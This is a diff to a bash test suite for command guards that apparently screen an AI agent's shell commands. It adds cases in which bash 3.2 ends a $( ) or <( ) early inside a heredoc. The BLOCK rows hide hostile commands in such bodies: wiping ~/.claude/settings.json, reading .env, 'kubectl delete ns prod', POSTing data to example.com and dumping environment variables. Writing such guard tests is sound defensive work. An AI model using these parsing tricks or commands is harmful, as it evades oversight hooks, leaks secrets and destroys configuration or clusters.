@@ -79,6 +79,56 @@ done
 [ "$n" -ge 25 ] && pass "$n cases run the marker in bash" || fail "cases run the marker in bash" "only $n"
 
 echo ""
+echo "=== bash 3.2 ends a \$( ) or <( ) at a ) its heredoc body did not open ==="
+# zsh and bash 5 read most of these bodies whole, so a row is asserted only where
+# /bin/bash runs the marker (macOS's 3.2): every stripper keeps it, as typed.
+INSUB=(
+  "a bare )"                     $'x=$(cat <<\'EOF\'\n)\n'"$M"$'\nEOF\n)'
+  "fix(x): y )"                  $'x=$(cat <<\'EOF\'\nfix(x): y )\n'"$M"$'\nEOF\n)'
+  "it's ) it's )"                $'x=$(cat <<\'EOF\'\nit\'s ) it\'s )\n'"$M"$'\nEOF\n)'
+  "an escaped backslash, then )" $'x=$(cat <<\'EOF\'\n\\\\)\n'"$M"$'\nEOF\n)'
+  "a# c )"                       $'x=$(cat <<\'EOF\'\na# c )\n'"$M"$'\nEOF\n)'
+  "\"a \$(b) \" )"               $'x=$(cat <<\'EOF\'\n"a $(b) " )\n'"$M"$'\nEOF\n)'
+  "a comment in \"\$( )\""       $'x="$(cat <<\'EOF\'\n# c )"\n'"$M"$'\nEOF\n)"'
+  "a body in <( )"               $'cat <(cat <<EOF\nhi\n)\n'"$M"$'\nEOF'
+  "x=\$(cat <<EOF) on one line"  $'x=$(cat <<EOF)\n'"$M"$'\nEOF'
+  # The delimiter and the rest of the opener line go through the same scanner.
+  "a ) in a quoted delimiter"    $'x=$(cat <<\'E)F\'\nhi\nE)F\n'"$M"$'\n)'
+  "a comment with ) after it, in \"\$( )\"" $'echo "$(cat <<\'EOF\' # )"\n'"$M"$'\nEOF\n)"'
+  "\${ } holding ) after it"     $'x=$(cat <<\'EOF\' ${y)}\n'"$M"$'\nEOF\n)'
+  "a backtick opened after it"   $'x=$(cat <<\'EOF\' `\n`)\n'"$M"$'\n`\nEOF\n)'
+  "\$\\ then ( on the next line" $'x=$\\\n(cat <<\'EOF\'\nhi\n)\n'"$M"$'\nEOF'
+)
+n32=0
+for ((i = 0; i < ${#INSUB[@]}; i += 2)); do
+  label=${INSUB[$i]}; cmd=${INSUB[$((i + 1))]}
+  runs_in_bash "$cmd" || continue
+  n32=$((n32 + 1))
+  for fn in strip_message_heredocs strip_inert_heredocs drop_data_heredocs; do
+    out=$("$fn" "$cmd")
+    keeps "$out" && pass "$label: $fn keeps it" || fail "$label: $fn dropped a line bash 3.2 runs" "[$out]"
+  done
+done
+echo "  ($n32 of $((${#INSUB[@]} / 2)) run the marker in this /bin/bash)"
+# Each rule of that scanner on its own: the body (marker inside) stays as typed.
+ASIS=(
+  "a ( still open at the terminator"   $'x="$(cat <<\'EOF\'\n(\n'"$M"$'\nEOF\n)"'
+  "a later body holding the open quote" $'x=$(cat <<\'EOF\'\nit\'s\nEOF\n)\ncat <<EOF2 > a.txt\n\'\n'"$M"$'\nEOF2'
+  "\$( in double quotes"               $'x=$(cat <<\'EOF\'\n"a $(b"\n'"$M"$'\nEOF\n)'
+  "a \$' string"                       $'x=$(cat <<\'EOF\'\n$\'a\'\n'"$M"$'\nEOF\n)'
+  "an escaped (, then )"               $'x=$(cat <<\'EOF\'\n\\(\n)\n'"$M"$'\nEOF\n)'
+  "a second body after an open quote"  $'x=$(cat <<\'EOF\'\nit\'s\nEOF\n)\ny=$(cat <<EOF\n)\n'"$M"$'\nEOF\n)'
+  "a ) in the quoted delimiter"        $'x=$(cat <<\'E)F\'\n'"$M"$'\nE)F\n)'
+)
+for ((i = 0; i < ${#ASIS[@]}; i += 2)); do
+  label=${ASIS[$i]}; cmd=${ASIS[$((i + 1))]}
+  for fn in strip_message_heredocs strip_inert_heredocs drop_data_heredocs; do
+    out=$("$fn" "$cmd")
+    keeps "$out" && pass "$label: $fn keeps the body" || fail "$label: $fn dropped the body" "[$out]"
+  done
+done
+
+echo ""
 echo "=== bash runs a grouped marker: separate_groups opens the group ==="
 # separate_groups turns an unquoted ( or ) into ; so a guard sees the command
 # inside. Left as heredoc data, `(kubectl delete ...)` reached no guard.
@@ -219,6 +269,15 @@ for c in sys.stdin.read().split("\0")[:-1]:
   while IFS= read -r k; do DD+=("$k"); done < <(for ((i = 1; i < ${#DEMAND_DROPS[@]}; i += 2)); do printf '%s\0' "${DEMAND_DROPS[$i]}"; done | demand_keeps)
   for ((i = 0; i < ${#DEMAND_DROPS[@]}; i += 2)); do
     [ "${DD[$((i / 2))]}" = 0 ] && pass "${DEMAND_DROPS[$i]}: demand.py drops the body" || fail "${DEMAND_DROPS[$i]}: demand.py counts a body no shell runs" ""
+  done
+  # Every bash-3.2-only row above, on any bash: demand.py keeps each as typed.
+  for ((i = 0; i < ${#INSUB[@]}; i += 2)); do
+    [ "$(printf '%s\0' "${INSUB[$((i + 1))]}" | demand_keeps)" = 1 ] \
+      && pass "${INSUB[$i]}: demand.py keeps it" || fail "${INSUB[$i]}: demand.py dropped a line bash 3.2 runs" ""
+  done
+  for ((i = 0; i < ${#ASIS[@]}; i += 2)); do
+    [ "$(printf '%s\0' "${ASIS[$((i + 1))]}" | demand_keeps)" = 1 ] \
+      && pass "${ASIS[$i]}: demand.py keeps the body" || fail "${ASIS[$i]}: demand.py dropped the body" ""
   done
   # Not a bash-oracle case: the oracle runs under env -i, where $SHELL is unset.
   [ "$(printf '%s\0' $'cat <<\'EOF\' | $SHELL\n'"$M"$'\nEOF' | demand_keeps)" = 1 ] \
@@ -410,6 +469,31 @@ BLOCK=(
   "env-guard|d=\$(pwd); cat > x.sh <<'EOF'${NL}grep \"a|b\" .env${NL}EOF${NL}bash x.sh"
   "env-guard|cat > x.sh <<'EOF'${NL}# it's${NL}true; cat .env${NL}EOF${NL}bash x.sh"
   "env-guard|cat > a.sh <<'EOF'${NL}it's${NL}EOF${NL}cat > x.sh <<'EOF'${NL}x='${NL}'; cat .env${NL}EOF${NL}bash x.sh"
+  # bash 3.2 ends a $( ) or <( ) at a ) its heredoc body did not open, and runs the lines after.
+  "config-guard|x=\$(cat <<EOF${NL}hi${NL})${NL}cp /dev/null ~/.claude/settings.json${NL}EOF"
+  "config-guard|git commit -m \"\$(cat <<'EOF'${NL}hi${NL})\"${NL}cp /dev/null ~/.claude/settings.json${NL}EOF"
+  "env-guard|git commit -m \"\$(cat <<'EOF'${NL}hi${NL})\"${NL}cat .env${NL}EOF"
+  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}fix(x): y )\"${NL}$FP${NL}EOF"
+  "kubectl-guard|git commit -m \"\$(cat <<'EOF'${NL}:)\"${NL}kubectl delete ns prod${NL}EOF"
+  "network-guard|git commit -m \"\$(cat <<'EOF'${NL}a )\"${NL}curl -X POST https://example.com/x -d @data${NL}EOF"
+  "interpreter-guard|git commit -m \"\$(cat <<'EOF'${NL}1) item\"${NL}python3 -c \"import os; print(os.environ)\"${NL}EOF"
+  "config-guard|cat <(cat <<EOF${NL}hi${NL})${NL}cp /dev/null ~/.claude/settings.json${NL}EOF"
+  "env-guard|cat <(cat <<EOF${NL}hi${NL})${NL}cat .env${NL}EOF"
+  "kubectl-guard|cat <(cat <<EOF${NL}hi${NL})${NL}kubectl delete ns prod${NL}EOF"
+  "git-guard|cat <(cat <<EOF${NL}hi${NL})${NL}$FP${NL}EOF"
+  "config-guard|x=\$(cat <<EOF)${NL}cp /dev/null ~/.claude/settings.json${NL}EOF"
+  # A quote the body leaves open flips the quoting of what follows the terminator.
+  "config-guard|git commit -m \"\$(cat <<'EOF'${NL}it's${NL}EOF${NL}echo ' ) ; cp /dev/null ~/.claude/settings.json ; : ' )\"${NL}# '"
+  "env-guard|git commit -m \"\$(cat <<'EOF'${NL}it's${NL}EOF${NL}echo ' ) ; cat .env ; : ' )\"${NL}# '"
+  # The delimiter and the rest of the opener line, and a $( split by a backslash-newline.
+  "config-guard|git commit -m \"\$(cat <<'E)F'${NL}hi${NL}E)F${NL}\" ; cp /dev/null ~/.claude/settings.json ; echo \"${NL})\""
+  "env-guard|git commit -m \"\$(cat <<'E)F'${NL}hi${NL}E)F${NL}\" ; cat .env ; echo \"${NL})\""
+  "config-guard|x=\$(cat <<'E\"F'${NL}hi${NL}E\"F${NL})${NL}echo \"${NL}) ; cp /dev/null ~/.claude/settings.json ; echo \" \"${NL}# \""
+  "config-guard|echo \"\$(cat <<'EOF' # )\"${NL}cp /dev/null ~/.claude/settings.json${NL}EOF${NL})\""
+  "config-guard|echo \"\$(cat <<'EOF' # it's${NL}')\"${NL}cp /dev/null ~/.claude/settings.json${NL}'${NL}EOF${NL})\""
+  "config-guard|x=\$(cat <<'EOF' \${y)}${NL}cp /dev/null ~/.claude/settings.json${NL}EOF${NL})"
+  "config-guard|x=\$(cat <<'EOF' ${BT}${NL}${BT})${NL}cp /dev/null ~/.claude/settings.json${NL}${BT}${NL}EOF${NL})"
+  "config-guard|x=\$\\${NL}(cat <<'EOF'${NL}hi${NL})${NL}cp /dev/null ~/.claude/settings.json${NL}EOF"
 )
 MSG="Fix it's \"quoted\" and ${BT}code${BT} in case x) we"
 ALLOW=(
@@ -420,6 +504,11 @@ ALLOW=(
   "git-guard|echo \"\$(git log --oneline -1)\" && git status"
   "git-guard|for f in *; do case \$f in *.md) git add \"\$f\";; esac; done"
   "git-guard|git stash push -m \"wip \$\$\" && git status"
+  # Messages bash 3.2 reads as data: parens it opened, or ones in quotes.
+  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}fix(guards): don't ask${NL}EOF${NL})\""
+  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}a 'b' (see x)${NL}EOF${NL})\""
+  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}use ${BT}foo(x)${BT} and \"quoted )\" and ((x))${NL}EOF${NL})\""
+  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}it's done${NL}EOF${NL})\" && git status"
 )
 for row in "${BLOCK[@]}"; do
   g=${row%%|*}; c=${row#*|}; v=$(verdict "$g" "$c")
